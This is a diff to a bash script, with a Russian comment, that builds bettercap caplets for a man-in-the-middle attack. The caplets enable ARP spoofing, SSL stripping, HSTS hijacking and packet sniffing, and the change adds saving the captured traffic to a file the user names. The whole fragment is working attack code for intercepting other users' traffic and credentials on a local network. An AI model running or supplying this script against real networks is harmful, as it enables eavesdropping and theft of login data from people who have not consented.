@@ -74,15 +74,18 @@ if [[ "$user_descison3" == "1" ]]; then
 		echo -e "Moving next...\n"
 	fi
 	
+	echo "Enter path to save captured data (/home/kali/Desktop/captured.cap)"
+	read -p '--> ' path
+	
 	# Создание каплета
 	if [[ "$user_descison4" == "y" ]] && [[ "$user_descison5" == "y" ]]; then
-		echo -e "net.probe on\nsslstrip on\nset arp.spoof.fullduplex true\narp.spoof on\nnet.sniff on\nhstshijack/hstshijack" > caplet.cap	
+		echo -e "net.probe on\nsslstrip on\nset arp.spoof.fullduplex true\narp.spoof on\nnet.sniff on\nset net.sniff.output $path\nhstshijack/hstshijack" > caplet.cap	
 	elif [[ "$user_descison4" == "y" ]] && [[ "$user_descison5" == "n" ]]; then
-		echo -e "net.probe on\nset arp.spoof.fullduplex true\narp.spoof on\nnet.sniff on\nhstshijack/hstshijack" > caplet.cap
+		echo -e "net.probe on\nset arp.spoof.fullduplex true\narp.spoof on\nnet.sniff on\nset net.sniff.output $path\nhstshijack/hstshijack" > caplet.cap
 	elif [[ "$user_descison4" == "n" ]] && [[ "$user_descison5" == "n" ]]; then
-		echo -e "net.probe on\nset arp.spoof.fullduplex true\narp.spoof on\nnet.sniff on" > caplet.cap
+		echo -e "net.probe on\nset arp.spoof.fullduplex true\narp.spoof on\nnet.sniff on\nset net.sniff.output $path" > caplet.cap
 	else
-		echo -e "net.probe on\nset arp.spoof.fullduplex true\narp.spoof on\nnet.sniff on" > caplet.cap
+		echo -e "net.probe on\nset arp.spoof.fullduplex true\narp.spoof on\nnet.sniff on\nset net.sniff.output $path" > caplet.cap
 	fi	
 	
 	eval "bettercap -caplet caplet.cap"	
@@ -99,4 +102,3 @@ fi
 
 eval "echo "0" > /proc/sys/net/ipv4/ip_forward"
 eval "rm -rf caplet.cap"
-
